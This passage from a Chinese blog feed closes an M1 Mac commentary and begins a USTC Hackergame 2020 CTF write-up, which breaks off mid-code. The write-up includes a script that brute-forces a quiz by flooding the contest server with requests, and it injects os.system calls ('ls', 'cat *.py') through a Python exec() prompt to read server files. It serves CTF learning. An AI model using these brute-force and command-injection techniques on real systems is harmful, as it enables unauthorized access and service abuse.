架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-11</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span 